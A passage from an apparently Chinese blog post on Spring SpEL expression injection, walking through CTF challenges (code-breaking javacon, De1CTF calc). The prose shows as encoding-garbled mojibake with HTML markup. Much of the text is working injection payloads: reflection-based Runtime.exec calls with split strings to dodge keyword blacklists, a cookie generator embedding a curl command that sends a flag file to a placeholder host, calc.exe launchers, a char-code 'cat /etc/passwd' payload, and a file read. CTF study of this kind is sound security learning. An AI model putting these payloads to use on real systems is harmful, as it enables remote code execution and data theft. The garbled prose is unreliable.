language)çš„ä¸€ç§ã€‚ä¹‹æ‰€ä»¥å«SpELæ˜¯å› ä¸ºå®ƒæ˜¯åº”ç”¨åœ¨Springæ¡†æ¶ä¸­çš„ã€‚ä¸è¿‡åªè¦æŒæ¡äº†SpELçš„ç›¸å…³çŸ¥è¯†ï¼Œæƒ³å¿…å…¶ä»–çš„è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ä¹Ÿèƒ½æ”¶æ‰‹åˆ°æ“’æ¥å§ã€‚</p><p>SpELæœ‰è®¸å¤šç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><p>å› æ­¤æˆ‘è®¤ä¸ºä¸Šé¢ä¸€ç±»javaçš„sstiåˆ©ç”¨æœ¬è´¨ä¸Šè¿˜æ˜¯åœ¨å®šç•Œç¬¦ä¸­è¿›è¡Œäº†è¡¨è¾¾å¼è¿ç®—,æ‰€ä»¥äº†è§£è¡¨è¾¾å¼æ³¨å…¥ä¹Ÿå°±æˆä¸ºäº†é‡ä¸­ä¹‹é‡ã€‚</p><p>é¦–å…ˆæ˜¯è¯­æ³•çŸ¥è¯†</p><ul><li>SpELæ”¯æŒçš„å®šç•Œç¬¦</li></ul><p><code>#{}</code></p><blockquote><p>å¼•ç”¨å…¶ä»–å¯¹è±¡:#{car}<br>å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š#{car.brand}<br>è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š#{car.toString()}</p></blockquote><p>å±æ€§åç§°è¿˜å¯ä»¥ä½¿ç”¨<code>${xxxx}</code><br>æ­¤å¤–è¿˜æœ‰ä¸€ç§ä½¿ç”¨Tè¿ç®—ç¬¦,è°ƒç”¨ç±»ä½œç”¨åŸŸæ–¹æ³•å’Œå¸¸é‡<code>#{T(java.lang.Math)}</code>è¿”å›ä¸€ä¸ªjava.lang.Mathå¯¹è±¡</p><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬ä¼šæŠŠSpELç”¨åœ¨xmlé…ç½®æˆ–è€…æ³¨è§£çš„ä½¿ç”¨ä¸­ï¼Œè¿™åº”è¯¥æ˜¯æ˜¯ä¸ºäº†å…¶åŠ¨æ€æ€§ã€‚é™¤æ­¤ä¹‹å¤–å°±æ˜¯ç›´æ¥ç”¨åœ¨ä»£ç å—ä¸­è¿›è¡Œexpression.</p><p>å¯¼è‡´SpELæ³¨å…¥çš„åŸå› å¦‚ä¸‹:</p><blockquote><p>SimpleEvaluationContextå’ŒStandardEvaluationContextæ˜¯SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextï¼š<br>SimpleEvaluationContextâ€‰- é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚<br>StandardEvaluationContextâ€‰- å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</p></blockquote><p>åœ¨ä¸æŒ‡å®šEvaluationContextçš„æƒ…å†µä¸‹é»˜è®¤é‡‡ç”¨çš„æ˜¯StandardEvaluationContextï¼Œè€Œå®ƒåŒ…å«äº†SpELçš„æ‰€æœ‰åŠŸèƒ½ï¼Œåœ¨å…è®¸ç”¨æˆ·æ§åˆ¶è¾“å…¥çš„æƒ…å†µä¸‹å¯ä»¥æˆåŠŸé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>æ­¤å¤„javasecçš„SpELå‘½ä»¤æ‰§è¡Œç†è®ºä¸Šåªè¦ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"curl xxx"</span>)</span><br></pre></td></tr></table></figure><p>å³å¯ã€‚ä¸è¿‡è¿™é‡Œæ‰§è¡Œæ—¶æ€»æ˜¯ä¸æˆåŠŸï¼Œæœ‰ç‚¹è¿·ã€‚ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæ¯•ç«Ÿæ— è®ºæ¯”èµ›è¿˜æ˜¯å®æˆ˜éƒ½ä¸å¯èƒ½ç¢°ä¸Šæ²¡æœ‰wafçš„SpELã€‚è¿™é‡Œå¹²è„†ç›´æ¥æ‰¾å…¶ä»–çš„å‡ ä¸ªä¾‹å­æ¥è¯•è¯•<br>(å…¶å®æ‡’å¾—æœ¬åœ°å»ºä¸ªmavené¡¹ç›®äº†ï¼Œæˆ‘è‡ªå·±çˆ¬)</p><ul><li>code-breaking javacon</li></ul><p>å¹´åˆçš„é¢˜ä¸€ç›´ç•™åˆ°ç°åœ¨â€¦å°±æ˜¯ä¸ºäº†å­¦SpELçš„è¿™ä¸€å¤©ã€‚</p><p>é¢˜ç›®çš„æºç jarä¸‹å¥½åã€‚è€æ ·å­æ‰”è¿›libé‡Œç›´æ¥å®¡è®¡<br>ç»“æ„:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åœ¨é…ç½®application.xmlä¸­æœ‰è¿™æ ·çš„é»‘åå•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    encoding: UTF-8</span><br><span class="line">    cache: false</span><br><span class="line">    mode: HTML</span><br><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br><span class="line">user:</span><br><span class="line">  username: admin</span><br><span class="line">  password: admin</span><br><span class="line">  rememberMeKey: c0dehack1nghere1</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯é™åˆ¶äº†Runtime.execçš„å‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªwafçœŸçš„éå¸¸å‹å¥½äº†â€¦</p><p>å†æ¥çœ‹ä¸»ä½“æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> io.tricking.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.tricking.challenge.spel.SmallEvaluationContext;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.common.TemplateParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CookieValue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.HttpClientErrorException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</span><br><span class="line">    ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KeyworkProperties keyworkProperties;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserConfig userConfig;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainController</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String rememberMeValue, HttpSession session, Model model) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            String username = <span class="keyword">this</span>.userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span> &amp;&amp; !username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            model.addAttribute(<span class="string">"name"</span>, <span class="keyword">this</span>.getAdvanceValue(username.toString()));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(&#123;<span class="string">"/login"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(&#123;<span class="string">"/login-error"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">loginError</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"loginError"</span>, <span class="keyword">true</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"errorMsg"</span>, <span class="string">"ç™»é™†å¤±è´¥ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(&#123;<span class="string">"/login"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>,required = <span class="keyword">true</span>)</span> String username, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>,required = <span class="keyword">true</span>)</span> String password, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String isRemember, HttpSession session, HttpServletResponse response) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.userConfig.getUsername().contentEquals(username) &amp;&amp; <span class="keyword">this</span>.userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                Cookie c = <span class="keyword">new</span> Cookie(<span class="string">"remember-me"</span>, <span class="keyword">this</span>.userConfig.encryptRememberMe());</span><br><span class="line">                c.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">                response.addCookie(c);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login-error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(&#123;HttpClientErrorException<span class="class">.<span class="keyword">class</span>&#125;)</span></span><br><span class="line"><span class="class">    @<span class="title">ResponseStatus</span>(<span class="title">HttpStatus</span>.<span class="title">FORBIDDEN</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">handleForbiddenException</span>() </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"forbidden"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">        String[] var2 = <span class="keyword">this</span>.keyworkProperties.getBlacklist();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            String keyword = var2[var4];</span><br><span class="line">            Matcher matcher = Pattern.compile(keyword, <span class="number">34</span>).matcher(val);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">        Expression exp = <span class="keyword">this</span>.parser.parseExpression(val, parserContext);</span><br><span class="line">        SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµç¨‹éå¸¸ç®€å•ã€‚getAdvanceValueæ˜¯ä¸€ä¸ªè§£å¯†+æ£€æŸ¥é»‘åå•+è°ƒç”¨spelçš„æ–¹æ³•ã€‚è€Œæˆ‘ä»¬åœ¨ç™»å½•åç¨‹åºä¼šä»remembermeçš„cookieå¤„å¯¹è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ã€‚</p><p>æ³¨æ„åˆ°åŠ å¯†æ–¹å¼æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">encryptRememberMe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String encryptd = Encryptor.encrypt(<span class="keyword">this</span>.rememberMeKey, <span class="string">"0123456789abcdef"</span>, <span class="keyword">this</span>.username);</span><br><span class="line">        <span class="keyword">return</span> encryptd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>rememberMeKeyæˆ‘ä»¬æ˜¯çŸ¥é“çš„,æ‰€ä»¥å°±å¯ä»¥ç”Ÿæˆå¯¹åº”çš„cookiepayloadäº†ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"curl xxxx\"&#125;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„é—®é¢˜ã€‚å¹¶ä¸”æœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨çš„åå°„ä½œä¸ºåŸºç¡€payload.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç”Ÿæˆcookieçš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">spel</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Encryptor.encrypt(<span class="string">"c0dehack1nghere1"</span>, <span class="string">"0123456789abcdef"</span>, <span class="string">"#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"curl xxxxx/`cat /fla*`\"&#125;)&#125;"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ”¶ä¸‹flag.</p><p>ç”±äºè¿˜æœ‰å¾ˆå¤šCVEä¹Ÿæ˜¯SpELç›¸å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›¸ä¼¼çš„æ€è·¯æ„é€ payload.æ¯”å¦‚ç”¨javascriptå¼•æ“è·ŸProcessBuilder</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„ ScriptEngineManagerç±»ã€‚è·å–eval.</span></span><br><span class="line">#&#123;T(String).getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.la"+"ng.Run"+"time.getRun"+"time().ex"+"ec('calc.exe')")&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åå°„ ProcessBuilder,è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">#&#123;(T(String).getClass().forName("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]&#123;'calc.exe'&#125;)).start()&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¹‹å‰è§è¿‡çš„ç”¨åˆ°æ•°ç»„ç»•è¿‡çš„æ–¹æ³•æ„é€ çš„Nuxeo rceçš„payloadã€‚ç”¨äºbyoass getclass</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc.exe')&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™ä¸ªpayloadå¥½åƒæµ‹è¯•æ—¶å°±æ²¡æˆåŠŸè¿‡ã€‚</p><p>ç„¶åè¿˜æœ‰ä¸€ç§bypasså¼•å·çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">116</span>)).concat(T(java.lang.Character).toString(<span class="number">32</span>)).concat(T(java.lang.Character).toString(<span class="number">47</span>)).concat(T(java.lang.Character).toString(<span class="number">101</span>)).concat(T(java.lang.Character).toString(<span class="number">116</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)).concat(T(java.lang.Character).toString(<span class="number">47</span>)).concat(T(java.lang.Character).toString(<span class="number">112</span>)).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">115</span>)).concat(T(java.lang.Character).toString(<span class="number">115</span>)).concat(T(java.lang.Character).toString(<span class="number">119</span>)).concat(T(java.lang.Character).toString(<span class="number">100</span>))).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>å³åˆ©ç”¨Tè¿ç®—ç¬¦è·å–åˆ°Charactorå†ç”¨toStringæ¥å¾—åˆ°å­—ç¬¦ã€‚</p><ul><li>De1CTF calc</li></ul><p>ä¸Šé¢çš„éƒ½æ˜¯å‘½ä»¤æ‰§è¡Œpayloadã€‚ç„¶è€Œå®é™…ä¸Šå¦‚æœé‡åˆ°De1è¿™é“é¢˜ï¼ŒopenraspæŠŠåº•å±‚çš„å‘½ä»¤æ‰§è¡Œéƒ½hookçš„æƒ…å†µ,å°±åªèƒ½ä»åˆ«çš„æ€è·¯ä¸‹æ‰‹äº†ã€‚(è™½ç„¶dalaoè¿˜æ˜¯RCEäº†,å¤ªå¼ºäº†)<br>é¢˜ç›®çš„è¿‡æ»¤å¤§è‡´å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder</span><br><span class="line">java.lang</span><br><span class="line">getClass</span><br><span class="line">Runtime</span><br><span class="line">new</span><br><span class="line">T(</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>å…ˆæ˜¯è¿™å±‚è¿‡æ»¤,ç„¶åæ‰æ˜¯openraspçš„ä¿æŠ¤ã€‚</p><p>è¿™é“é¢˜é¦–å…ˆå¦‚æœåˆ©ç”¨spelä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„ç‰¹æ€§,å¯ä»¥ç›´æ¥å¿½è§†<code>new</code>è¢«è¿‡æ»¤çš„æƒ…å†µè¯»æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.io.BufferedReader(New java.io.FileReader(<span class="string">"/flag"</span>)).readLine()</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¸ˆå‚…å¯¹äºè¿™äº›å…³é”®å­—çš„ç»•è¿‡ä¹Ÿæœ‰å…¶ä»–çš„åŠæ³•<br><a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">https://landgrey.me/blog/15/</a></p><p>æ¯”å¦‚å‰é¢çš„getClass(),é™¤äº†ç”¨æ•°ç»„ç»•è¿‡,è¿˜å¯ä»¥ç”¨<code>&#39;&#39;.class.getSuperclass().class</code>è·å–åˆ°</p><p>é™¤æ­¤ä»¥å¤–ï¼Œè¿˜FUZZå‡ºäº†<code>T%00(</code>å¯ä»¥ç»•è¿‡<code>T(</code>çš„wafçš„æ‰‹æ®µã€‚(è¿™æ˜¯åº•å±‚æºç çš„é—®é¢˜,è†œ)</p><p>è‡³äºdalaoè¾¾æˆRCEçš„æ€è·¯,æˆ‘è§‰å¾—ä¹Ÿéå¸¸å€¼å¾—å­¦ä¹ ã€‚å› ä¸ºæˆ‘ä»¬æƒ³è¦è¯»æ–‡ä»¶æˆ–è€…æ‰§è¡Œå‘½ä»¤çš„è¯,å¿…ç„¶æ˜¯è¦åˆ›å»ºä¸€ä¸ªå®ä¾‹çš„ã€‚è€ŒSpELæä¾›äº†T()ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®ä¾‹,è¿™æ˜¯ä¸€ç§æ€è·¯ã€‚é™¤æ­¤ä»¥å¤–å°±æ˜¯ä½¿ç”¨javaä»£ç 